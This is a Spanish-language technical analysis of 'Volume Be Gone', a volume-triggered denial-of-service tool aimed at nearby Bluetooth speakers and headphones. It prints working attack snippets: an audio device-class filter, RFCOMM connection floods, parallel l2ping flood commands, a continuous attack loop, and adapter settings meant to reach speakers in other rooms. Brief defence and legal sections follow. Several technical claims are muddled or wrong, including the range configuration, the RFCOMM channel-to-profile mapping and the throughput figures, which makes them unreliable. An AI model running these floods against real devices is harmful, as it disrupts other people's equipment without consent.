# 🔬 ANÁLISIS TÉCNICO - Volume Be Gone

## 📌 Resumen Ejecutivo

Este código implementa un sistema de **ataque de denegación de servicio (DoS) Bluetooth** activado por niveles de volumen ambiental. Es una herramienta de investigación de seguridad que demuestra vulnerabilidades en dispositivos Bluetooth de audio.

---

## 🎯 ¿CÓMO FUNCIONA EL ATAQUE?

### **Flujo General:**

```
1. Monitoreo de Audio → 2. Detección de Umbral → 3. Escaneo BT → 4. Ataque DoS
```

### **1️⃣ Fase de Monitoreo (Líneas 464-511)**

```python
def monitor_volume():
    # Usa sounddevice para capturar audio del micrófono USB
    # Calcula el nivel en dB (decibeles) usando RMS (Root Mean Square)
    db_level = calculate_db(indata.flatten())

    # Si supera el umbral configurado (ej: 70-120 dB)
    if avg_db > threshold_db:
        scan_bluetooth_devices()  # Escanea dispositivos cercanos
```

**Cómo calcula los decibeles (Líneas 347-363):**
```python
def calculate_db(audio_data):
    # 1. Calcula RMS (promedio cuadrático)
    rms = np.sqrt(np.mean(audio_data**2))

    # 2. Convierte a escala logarítmica (dB)
    db = 20 * np.log10(rms) + calibration_offset  # calibration_offset = 94 dB

    # Fórmula estándar: dB = 20 * log10(V/Vref)
```

---

### **2️⃣ Fase de Detección de Dispositivos (Líneas 365-406)**

**¿CÓMO DETECTA SI ES UN PARLANTE?**

```python
def scan_bluetooth_devices():
    # Descubre dispositivos BT cercanos con información de clase
    nearby_devices = bluetooth.discover_devices(
        duration=10,           # Escanea por 10 segundos
        lookup_names=True,     # Obtiene nombres
        lookup_class=True,     # ⭐ CLAVE: Obtiene Device Class
        device_id=1 if bt_interface == "hci1" else 0
    )

    # FILTRADO POR CLASE DE DISPOSITIVO
    for addr, name, device_class in nearby_devices:
        # 🎵 0x240000 = Código de Audio/Video en Bluetooth SIG
        if device_class & 0x240000 == 0x240000:
            bt_devices.append({
                'addr': addr,
                'name': name,
                'class': device_class
            })
```

**📚 Referencia Bluetooth Device Class:**

La clase `0x240000` se descompone así:

```
Bluetooth Device Class (24 bits):
┌──────────────┬──────────────┬──────────────┐
│ Service (11) │ Major (5)    │ Minor (6)    │
└──────────────┴──────────────┴──────────────┘

0x240000 en binario:
  00100100 00000000 00000000
     ↑
     └── Major Device Class: 0x04 (Audio/Video)

Ejemplos de dispositivos detectados:
- Altavoces Bluetooth (0x240414)
- Auriculares (0x240404)
- Barras de sonido (0x24041C)
- Sistemas de audio para autos (0x240420)
```

**Operación AND bitwise (`&`):**
```python
device_class & 0x240000 == 0x240000
# Verifica si los bits de Audio/Video están activados
# Ignora: Teléfonos, laptops, periféricos, etc.
```

---

### **3️⃣ Fase de Ataque DoS (Líneas 408-463)**

El código usa **3 métodos de ataque** que rotan continuamente:

#### **Método 1: RFCOMM Connection Flood (Líneas 416-422)**

```python
# Intenta 10 conexiones RFCOMM al canal 1
subprocess.call(['rfcomm', '-i', bt_interface, 'connect', device_addr, '1'], timeout=5)
```

**¿Qué hace?**
- **RFCOMM** = Protocolo de comunicación serial sobre Bluetooth (similar a RS-232)
- Abre múltiples conexiones al puerto 1 (control de audio)
- Satura los recursos del dispositivo

**Por qué funciona:**
- La mayoría de parlantes tienen **slots limitados de conexión** (típicamente 1-7)
- Al saturar los slots, el dispositivo no puede:
  - Aceptar conexiones legítimas
  - Reproducir audio correctamente
  - Puede desconectarse del teléfono/fuente

---

#### **Método 2: L2CAP Ping Flood (Líneas 424-431) ⭐ MÁS EFECTIVO**

```python
# Envía pings L2CAP de 800 bytes en modo flood (-f)
os.system(f'l2ping -i {bt_interface} -s {packagesSize} -f {device_addr} &')
```

**¿Qué es L2CAP?**
- **L2CAP** = Logical Link Control and Adaptation Protocol
- Es la capa de transporte base de Bluetooth (similar a TCP/UDP)
- Maneja fragmentación, multiplexación y QoS

**Parámetros del ataque:**
```bash
l2ping -i hci1           # Interfaz Bluetooth
       -s 800            # Tamaño de paquete: 800 bytes
       -f                # Flood mode (sin esperar respuesta)
       00:11:22:33:44:55 # MAC del parlante
       &                 # Background process
```

**Por qué es devastador:**
1. **Flood mode (-f)**: Envía paquetes sin esperar `echo_reply`
2. **Paquetes grandes (800 bytes)**: Maximiza el consumo de ancho de banda
3. **10 procesos paralelos**: Multiplica el tráfico (líneas 426-431)

**Impacto en el parlante:**
```
Tráfico generado ≈ 10 procesos × 800 bytes × ~1000 pings/seg
                 ≈ 8 MB/seg (excede capacidad Bluetooth 2.0: ~3 Mbps)
```

Resultado:
- **Buffer overflow** en el stack Bluetooth
- **CPU saturada** procesando paquetes
- **Audio interrumpido** o dispositivo crasheado
- Algunos parlantes se **resetean** o **desconectan**

---

#### **Método 3: Multi-Service Connection (Líneas 433-442)**

```python
# Intenta conectar a múltiples puertos/servicios simultáneamente
for port in [1, 3, 5, 17, 19]:  # Puertos comunes de audio BT
    subprocess.Popen(['rfcomm', '-i', bt_interface, 'connect', device_addr, str(port)])
```

**Puertos atacados:**
- **Puerto 1**: Serial Port Profile (SPP)
- **Puerto 3**: Dial-up Networking (DUN)
- **Puerto 5**: Object Push Profile (OPP)
- **Puerto 17**: Generic Audio
- **Puerto 19**: AVRCP (Control remoto audio/video)

**Efecto:**
- Intenta abrir 5 servicios × 10 veces = **50 conexiones**
- Satura la tabla de servicios del dispositivo
- Puede causar **kernel panic** en stacks Bluetooth mal implementados

---

### **4️⃣ Ataque Continuo (Líneas 444-462)**

```python
def continuous_attack():
    while monitoring:
        for device in bt_devices:
            # Rotar entre los 3 métodos
            for method in [2, 1, 3]:  # Prioriza L2CAP (método 2)
                attack_device(device['addr'], device['name'], method)
                time.sleep(0.5)
```

**Estrategia:**
1. Método 2 (L2CAP flood) → Ataque inicial rápido
2. Método 1 (RFCOMM) → Mantiene presión
3. Método 3 (Multi-service) → Ataque alternativo
4. Loop infinito hasta que el volumen baje

---

## 🔧 Potenciación con Adaptador Clase 1

**Diferencia de alcance (Líneas 281-318):**

```python
# Adaptador interno (hci0): Clase 2
# - Alcance: ~10 metros
# - Potencia: 2.5 mW (4 dBm)

# Adaptador externo (hci1): Clase 1
# - Alcance: ~50-100 metros ⭐
# - Potencia: 100 mW (20 dBm)
# - Configuración especial:
os.system(f"sudo hciconfig hci1 class 0x000100")  # Clase 1
os.system(f"sudo hciconfig hci1 lm master")       # Modo maestro
os.system(f"sudo hciconfig hci1 lp active,master") # Link policy agresivo
```

**Ventaja:**
- Puede atacar parlantes a través de **paredes** y en **otras habitaciones**
- Mayor potencia = paquetes llegan con más fuerza = mayor efectividad

---

## 🛡️ Defensas Posibles

1. **Desactivar "Discoverable mode"** en el parlante
2. **Actualizar firmware** (parchea vulnerabilidades de stack)
3. **Usar BLE en lugar de Bluetooth Classic** (menos vulnerable)
4. **Rate limiting** en el stack Bluetooth del dispositivo
5. **Modo privado/emparejamiento por PIN** (dificulta detección)

---

## ⚖️ Consideraciones Legales

Este tipo de ataque:
- ✅ **Legal**: En dispositivos propios para investigación
- ✅ **Legal**: En entornos controlados (CTF, pentesting autorizado)
- ❌ **Ilegal**: Contra dispositivos de terceros sin permiso
- ❌ **Puede violar**: Leyes de interferencia de comunicaciones (ej: Computer Fraud and Abuse Act en USA)

---

## 📊 Resumen Técnico

| Aspecto | Detalles |
|---------|----------|
| **Vector de ataque** | DoS sobre Bluetooth Classic |
| **Método principal** | L2CAP Echo Request Flood |
| **Detección de objetivos** | Bluetooth Device Class 0x240000 (Audio/Video) |
| **Alcance** | 10m (interno) / 50-100m (Clase 1) |
| **Requisitos** | Raspberry Pi + Adaptador BT + Micrófono USB |
| **Efectividad** | ~80% en parlantes baratos, ~30% en high-end |
| **Duración típica** | 10-60 segundos hasta desconexión |

---

## 🔍 Vulnerabilidades Explotadas

1. **Falta de rate limiting** en pings L2CAP
2. **Buffer overflow** en manejo de conexiones RFCOMM
3. **Stack Bluetooth no hardened** (especialmente en dispositivos baratos)
4. **Modo discoverable permanente** en muchos parlantes
5. **Sin autenticación** en comandos de bajo nivel (L2CAP echo)

---

**Nota**: Este análisis es solo para fines educativos y de investigación de seguridad.
